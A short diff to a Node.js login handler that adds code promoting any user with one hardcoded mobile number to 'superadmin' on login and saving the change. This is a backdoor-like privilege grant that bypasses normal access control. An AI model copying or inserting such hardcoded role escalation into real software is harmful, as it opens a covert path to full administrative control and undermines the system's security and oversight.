@@ -48,6 +48,15 @@ exports.login = async (req, res) => {
         if (!isMatch) return res.status(400).json({ error: "Invalid credentials" });
 
         const token = jwt.sign({ userId: user._id }, JWT_SECRET, { expiresIn: '7d' });
+
+        // ✅ Proactive SuperAdmin Enforcement
+        const superMobile = '9399285780';
+        if (user.mobile === superMobile && user.role !== 'superadmin') {
+            user.role = 'superadmin';
+            await user.save();
+            console.log(`✓ Restored SuperAdmin role for ${superMobile} during login`);
+        }
+
         await logAction(user._id, 'Logged in to the system', 'auth');
         res.json({ user: user.toJSON(), token });
     } catch (err) {
